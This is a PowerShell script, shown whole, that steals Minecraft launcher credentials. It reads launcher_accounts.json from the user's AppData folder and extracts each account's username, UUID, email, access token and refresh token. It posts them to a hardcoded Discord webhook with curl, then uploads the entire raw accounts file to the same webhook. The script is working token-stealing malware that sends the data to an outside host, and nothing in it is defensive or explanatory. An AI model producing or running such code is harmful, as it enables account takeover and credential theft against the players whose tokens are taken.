# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"

# Target the correct file
$accountsPath = "$env:APPDATA\.minecraft\launcher_accounts.json"

if (-not (Test-Path $accountsPath)) {
    Write-Host "launcher_accounts.json not found!"
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit
}

Write-Host "Found launcher_accounts.json, extracting tokens..."

# Parse the JSON
$json = Get-Content $accountsPath -Raw | ConvertFrom-Json

# Loop through each account
foreach ($key in $json.accounts.PSObject.Properties.Name) {
    $account = $json.accounts.$key
    $username = $account.minecraftProfile.name
    $uuid = $account.minecraftProfile.id
    $accessToken = $account.accessToken
    $refreshToken = $account.refreshToken
    $email = $account.username

    $message = "**New Account**\n\`\`\`\nUsername: $username\nUUID: $uuid\nEmail: $email\nAccess Token: $accessToken\nRefresh Token: $refreshToken\n\`\`\`"

    $payload = [PSCustomObject]@{ content = $message } | ConvertTo-Json -Compress

    & curl.exe -s -X POST $webhookUrl `
        -H "Content-Type: application/json" `
        -d $payload

    Write-Host "Sent: $username"
}

# Also send raw file as backup
Write-Host "Sending raw file..."
$rawPayload = '{"content":"Raw accounts file:"}'
& curl.exe -s -X POST $webhookUrl -F "payload_json=$rawPayload" -F "file=@$accountsPath"

Write-Host ""
Write-Host "All done! Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
